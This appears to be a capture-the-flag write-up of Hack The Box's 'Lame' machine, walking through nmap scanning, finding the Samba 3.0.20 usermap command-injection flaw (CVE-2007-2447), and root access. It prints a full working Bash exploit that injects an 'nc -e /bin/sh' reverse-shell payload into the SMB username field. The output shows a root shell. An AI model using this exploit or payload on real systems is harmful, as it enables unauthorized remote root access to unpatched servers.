<p align="center"><img src="img/banner.png" width="700" height="450" alt="Lame"></img></p>
<p align="center">Machine creator: <a href="https://app.hackthebox.com/profile/1">ch4p</a></p>
<p align="center">Platform: <a href="https://www.hackthebox.com/">Hack The Box</a></p>

<br>

Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.

- [Reconnaissance](#reconnaissance)
    + [Nmap Scan](#nmap-scan)
    + [SMB Enumeration](#smb-enumeration)
- [Foothold](#foothold)
    + [Developing custom exploit in Bash](#developing-custom-exploit-in-Bash)
    + [Exploitation](#exploitation)
- [References](#references)

<br>

---

# Reconnaissance

### Nmap Scan

To begin the initial stage we are going to be using Nmap, which is a command line tool that is used to discover hosts and services on a network. It does this by sending packets, which are small units of data, and analysing the responses. Based off the responses it can tell which ports are open and what services are being run on said ports.

`-p-` flag will scan all ports, `--open` flag will report only ports that are opened, `--min-rate 5000` flag will make our scan really fast, useful for closed environments like this, `-n` flag will disable DNS resolutions, `-Pn` flag will disable ARP host discovery, `-vvv` flag will show occurrences while scan is running and `-oG` flag will export the result to said file (useful for grep, see <a href="https://github.com/oscar-rk/scripts/blob/main/Infosec/Recon/extractPorts.sh">extractPorts script</a>).

```shell
❯ nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv -oG allPorts 10.10.10.3
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 20:14 CEST
Initiating SYN Stealth Scan at 20:14
Scanning 10.10.10.3 [65535 ports]
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Completed SYN Stealth Scan at 20:14, 26.35s elapsed (65535 total ports)
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.045s latency).
Scanned at 2022-09-03 20:14:11 CEST for 26s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 24 (1.056KB)
```

Once we know which ports are open, we are going to run a service/version scan with default scripts.

`-sVC` will probe open ports to determine service/version information and run default scripts, `-p` flag will indicate what ports to scan and `-oN` flag will export the result to said file (default nmap format).

```shell
❯ nmap -sCV -p21,22,139,445,3632 -oN targeted 10.10.10.3
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-03 20:15 CEST
Nmap scan report for 10.10.10.3
Host is up (0.047s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-09-03T14:15:49-04:00
|_clock-skew: mean: 2h00m20s, deviation: 2h49m43s, median: 19s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.19 seconds
```

### SMB Enumeration

We found that there is a SMB service running on the target machine, which is very old and could be vulnerable.

Using `searchsploit` we will find for common vulnerabilities for this exact service.

```shell
❯ searchsploit samba 3.0.20
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                                                          | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                                                | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                           | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                           | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                                   | linux_x86/dos/36741.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We see that it is vulnerable and there is a Metasploit script that could let us inject commands into the `username` field when connecting to the SMB service.

We will examine the script with the following command:

`searchsploit -x unix/remote/16320.rb`

Inspecting the code, we can see how it works, paying attention to the following code block, it seems that it is injecting ``"/=`nohup " + payload.encoded + "`"`` into the username field, where `payload.encoded` would be the desired command to be run by the victim machine.


```ruby
def exploit

                connect

                # lol?
                username = "/=`nohup " + payload.encoded + "`"
                begin
                        simple.client.negotiate(false)
                        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
                rescue ::Timeout::Error, XCEPT::LoginError
                        # nothing, it either worked or it didn't ;)
                end

                handler
        end
```

# Foothold

### Developing custom exploit in Bash

Instead of using `Metasploit`, I will create a little custom exploit in `bash` that will start a listener in my machine and send the payload using `crackmapexec smb` method in order to automate the full exploitation with a single execution and get a reverse shell.

> You can find my custom exploit in https://github.com/oscar-rk/exploits/blob/main/CVE-2007-2447/CVE-2007-2447.sh

The code of the exploit is:

```bash
#!/bin/bash

# Exploit CVE-2007-2447 abusing usermap command injection to obtain RCE
# Author: oscar-rk - https://github.com/oscar-rk


# User exit handling
function ctrl_c(){
   echo -e "[!] Exiting script ...\n"   
   exit 1
}

# User exit catching
trap ctrl_c INT

# Args check
if [ "$#" -ne 4 ]; then
   echo -e "[!] Usage: $0 <local ip> <local port> <remote ip> <remote port>\n"
   exit 1
fi

# Exploit
function exploit(){
	# Initialising SMB exploitation
	sleep 1
	echo -e "starting exploit on [$3] $4 ..."
	crackmapexec --timeout 3 smb $3 --port $4 -u '/=`nohup nc -e /bin/sh '$1' '$2'`' -p '' &>/dev/null &

	# Listening for incoming reverse shell
	nc -nlvp $2 -w 10 #<-- Will exit script automatically if no reverse shell received after 10 seconds
}

# Execution
exploit $1 $2 $3 $4
```

We will assign execution permissions to it running `chmod +x <script>` command.

### Exploitation

Now, we can run the exploit and get the reverse shell.

```shell
❯ ./CVE-2007-2447.sh 10.10.14.7 4444 10.10.10.3 445
starting exploit on [10.10.10.3] 445 ...
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.3] 53206
hostname
lame
whoami
root
```

We are now `root` and successfully finished the challenge!

We can `cat` the the user and root flags.

---

# References

|__`CVE-2007-2447`__|__https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447__|
|:-|:-|
|__`My custom exploit - CVE-2007-2447.sh`__|__https://github.com/oscar-rk/exploits/blob/main/CVE-2007-2447/CVE-2007-2447.sh__|

<br>
<br>

___─ Written by <a href="https://github.com/oscar-rk">oscar-rk</a> ─___